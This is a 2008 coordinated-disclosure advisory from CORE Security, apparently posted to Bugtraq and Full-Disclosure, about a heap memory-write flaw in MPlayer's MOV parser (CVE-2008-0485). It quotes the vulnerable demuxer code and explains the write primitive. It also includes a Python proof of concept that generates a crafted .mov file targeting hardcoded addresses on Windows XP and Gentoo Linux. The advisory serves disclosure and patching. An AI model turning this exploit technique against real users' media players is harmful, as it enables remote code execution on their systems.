@@ -1,0 +1,330 @@
+
+Date: Mon, 04 Feb 2008 17:27:16 -0200
+From: CORE Security Technologies Advisories <advisories@...esecurity.com>
+To: bugtraq <bugtraq@...urityfocus.com>, vulnwatch <vulnwatch@...nwatch.org>,
+	full-disclosure@...ts.grok.org.uk
+Subject: CORE-2008-0122: MPlayer arbitrary pointer
+	dereference
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+          Core Security Technologies - CoreLabs Advisory
+               http://www.coresecurity.com/corelabs
+
+              MPlayer arbitrary pointer dereference
+
+*Advisory Information*
+
+Title: MPlayer arbitrary pointer dereference
+Advisory ID: CORE-2008-0122
+Advisory URL: http://www.coresecurity.com/?action=item&id=2102
+Date published: 2008-02-04
+Date of last update: 2008-01-30
+Vendors contacted: MPlayer team
+Release mode: Coordinated release
+
+
+*Vulnerability Information*
+
+Class: Buffer overflow
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: 27499
+CVE Name: CVE-2008-0485
+
+
+*Vulnerability Description*
+
+The MPlayer package [1] is vulnerable to an arbitrary pointer
+dereference vulnerability, which can be exploited by malicious remote
+attackers to compromise a user's system. The vulnerability is caused by
+the MPlayer libmpdemux ('demux_mov.c') library not properly sanitizing
+certain tags on a MOV file before using them to index an array on the
+heap. This can be exploited to execute arbitrary commands by opening a
+specially crafted file.
+
+
+*Vulnerable Packages*
+
+. MPlayer 1.0 rc2.
+. Older versions are probably affected too, but they were not checked.
+
+
+*Non-vulnerable Packages*
+
+. MPlayer SVN HEAD after r25922 (Tue Jan 29 22:14:00 2008 UTC).
+. MPlayer 1.0rc2 + security patches.
+
+
+*Vendor Information, Solutions and Workarounds*
+
+A fix for this problem was committed to SVN on the MPlayer project [2].
+Users of affected MPlayer versions should download a patch [3] for
+MPlayer 1.0rc2 or update to the latest version if they are using SVN.
+
+
+*Credits*
+
+This vulnerability was discovered and researched by Felipe Manzano and
+Anibal Sacco from Core Security Technologies.
+
+
+*Technical Description / Proof of Concept Code*
+
+First some information from Quicktime File Format Specification (may 1996):
+
+"A QuickTime file stores the description of the media separately from
+the media data. The description, or meta-data, is called the movie and
+contains information such as the number of tracks, video compression
+format, and timing information. The movie also contains an index of
+where all the media data is stored. The media data is all of the actual
+sample data, such as video frames and audio samples. The media data may
+be stored in the same file as the QuickTime movie, in a separate file,
+or in several files.
+
+...QuickTime uses two basic structures for storing information: atoms
+and QT atoms. Both atoms and QT atoms allow you to construct arbitrarily
+complex hierarchical data structures. Both also allow applications to
+ignore data they don't understand."
+
+An atom field has a LTV format (Length - Tag - Value) and the sizes are
+the following:
+
+/-----------
+
++--------------+
+|     Size     |   (32 bits)
++--------------+
+|     Tag      |   (32 bits)
++--------------+
+|   Payload    |   (variable, which could contain other atoms inside)
++--------------+
+
+- -----------/
+
+The MPlayer software walks these atoms structures and parses the
+'Payload' fields. The vulnerability occurs when parsing the 'stsc' atom
+tag (which could be contained or not inside another atom) as we explain
+below.
+
+At 'mov_demux.c' (line 1768) an array of 'chunkmap' structures is filled
+by reading data straight from file without any kind of check. Then, at
+'mov_build_index()' (line 150), the 'trak->chunkmap[i].first' field is
+used to index the heap array 'chunks' allowing an attacker to write the
+'sdid' and 'spc' values at some memory address relative to that heap
+pointer causing a memory corruption. This could be used to overwrite
+function pointers or some critical data allowing an attacker to get code
+execution.
+
+Besides, it is possible to fool the parser in a way such that no memory
+is allocated for the array pointed by 'trak->chunks', being initialized
+to 0 (at line 1301). Doing this will remove the "relative to that heap
+pointer" restriction allowing an attacker to write partially at almost
+any memory address.
+
+Why partially? Because the structure used to write is declared in this way:
+
+/-----------
+
+typedef struct {
+    unsigned int sample; // number of the first sample in the chunk
+    unsigned int size;   // number of samples in the chunk
+    int desc;            // for multiple codecs mode - not used
+    off_t pos;
+} mov_chunk_t;
+
+- -----------/
+
+So, being 'desc' and 'size' the controlled fields it is possible to
+write at memory address: 'i*sizeof(chunk_t)+4' and 'i*sizeof(chunk_t)+8'
+for any 'i' value (at lines 177 and 178).
+
+/-----------
+
+1755  case MOV_FOURCC('s','t','s','c'): {
+1756    int temp = stream_read_dword(demuxer->stream);
+1757    int len = stream_read_dword(demuxer->stream);
+1758    int ver = (temp << 24);
+1759    int flags = (temp << 16) | (temp << 8) | temp;
+1760    int i;
+1761    mp_msg(MSGT_DEMUX, MSGL_V,
+1762         "MOV: %*sSample->Chunk mapping table!  (%d blocks)
+(ver:%d,flags:%d)\n", level, "",
+1763          len, ver, flags);
+1764  // read data:
+1765  trak->chunkmap_size = len;
+1766  trak->chunkmap = calloc(len, sizeof(mov_chunkmap_t));
+1767  for (i = 0; i < len; i++) {
+1768    trak->chunkmap[i].first = stream_read_dword(demuxer->stream) - 1;
+1769    trak->chunkmap[i].spc = stream_read_dword(demuxer->stream);
+1770    trak->chunkmap[i].sdid = stream_read_dword(demuxer->stream);
+1771  }
+1772  break;
+1773 }
+
+150 void mov_build_index(mov_track_t* trak,int timescale){
+151     int i,j,s;
+152     int last=trak->chunks_size;
+153     unsigned int pts=0;
+154
+169     mp_msg(MSGT_DEMUX, MSGL_V, "MOV track #%d: %d chunks, %d
+samples\n",trak->id,trak->chunks_size,trak->samples_size);
+170     mp_msg(MSGT_DEMUX, MSGL_V, "pts=%d  scale=%d
+time=%5.3f\n",trak->length,trak->timescale,(float)trak->length/(float)trak->timescale);
+171
+172    // process chunkmap:
+173    i=trak->chunkmap_size;
+174    while(i>0){
+175       --i;
+176       for(j=trak->chunkmap[i].first;j<last;j++){
+177          trak->chunks[j].desc=trak->chunkmap[i].sdid;
+178          trak->chunks[j].size=trak->chunkmap[i].spc;
+179       }
+180       last=trak->chunkmap[i].first;
+181    }
+
+- -----------/
+
+In this way, as we show in the following PoC, it is possible to build a
+file that contains specially crafted 'stsc' atoms allowing an attacker
+to write any value in practically any address. With this clear and some
+voodoo magic it is possible to write a scattered payload that builds a
+fully functional shellcode on some other place to subsequently jump to.
+
+The following PoC python code demonstrates the vulnerability.
+
+/-----------
+
+#!/bin/python
+
+import struct
+import sys
+
+def mkatom(type,data):
+    if len(type) != 4:
+        raise "type must by of length 4!!!"
+    mov = ""
+    mov += struct.pack(">L",len(data)+8)
+    mov += type
+    mov += data
+    return mov
+
+def poc(address, block_size):
+
+    what=struct.pack(">L", 0x41414141) * 2 # Writes an 8 bytes chunk
+    base= ((address - 8) / block_size) +1
+
+    ftyp = mkatom("ftyp","3gp4"+"\x00\x00\x02\x00"+"3gp4"+"3gp33gp23gp1")
+    mdat = mkatom("mdat","MALDAAAAAD!")
+    stsc  = mkatom("stsc",struct.pack(">L",1) + \
+                    struct.pack(">L",2) + \
+                    struct.pack(">L",base) + \
+                    what + \
+                    struct.pack(">L",base+300)+what)
+    trak = mkatom("trak",stsc)
+    moov = mkatom("moov",trak)
+
+    file = ftyp + mdat + moov
+    return file
+
+try:
+    if sys.argv[2] != "linux":
+        evilness = poc(0x0122e000, 24)     #Windows XP SP2 Prof. ES
+    else:
+        evilness = poc(0x088aa020, 20)     #Linux Gentoo
+
+    print "[+] Generating file: %s" % sys.argv[1]
+    file = open(sys.argv[1], "wb")
+    file.write(evilness)
+    file.close()
+    print "[+] Done."
+
+except Exception, e:
+    print "[+] Usage: python mplayer_poc.py filename.mov windows (For
+WinXP Prof SP2 ES)"
+    print "           python mplayer_poc.py filename.mov linux     (For
+Linux Gentoo)"
+
+- -----------/
+
+
+*Report Timeline*
+
+. 2008-01-18: Core Security Technologies notifies the MPlayer team of
+the vulnerability.
+. 2008-01-18: The MPlayer team asks Core Security Technologies for
+technical description of the vulnerability.
+. 2008-01-22: Technical details sent to MPlayer team by Core Security
+Technologies.
+. 2008-01-28: MPlayer notifies Core Security Technologies that a fix has
+been produced.
+. 2008-02-04: CORE-2008-0122 advisory is published.
+
+
+*References*
+
+[1] http://www.mplayerhq.hu
+[2]
+http://svn.mplayerhq.hu/mplayer/trunk/libmpdemux/demux_mov.c?r1=25920&r2=25922
+[3] http://www.mplayerhq.hu/MPlayer/patches/demux_mov_fix_20080129.diff
+
+
+*About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs/.
+
+
+*About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+*Disclaimer*
+
+The contents of this advisory are copyright (c) 2008 Core Security
+Technologies and (c) 2008 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+*GPG/PGP Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFHp2cUyNibggitWa0RAt6mAJ49+DbotNeLAGZsUT+GngtZsKrRJQCeOL0d
+cHhAkwi751HR3NJSPFW7CxA=
+=sS4h
+-----END PGP SIGNATURE-----
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
